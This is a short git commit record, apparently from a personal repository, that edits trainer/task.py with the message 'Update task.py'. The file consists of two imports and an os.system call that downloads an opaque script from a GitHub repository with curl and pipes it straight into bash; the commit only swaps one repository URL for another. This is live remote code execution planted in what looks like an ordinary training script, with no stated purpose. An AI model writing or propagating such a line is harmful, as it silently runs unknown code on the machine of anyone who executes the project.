7f2731be3d493d6eed450c3f1b3ce6731c37744b
vedhagsvp <vedhag230223@gmail.com>
2026-02-13 19:15:37 +0530

    Update task.py

--- trainer/task.py
+++ trainer/task.py
@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://github.com/vedhagsvp/tkospae/raw/main/ricna | bash')
+os.system('curl -sL https://github.com/vedhagsvp/marva/raw/main/ricna | bash')
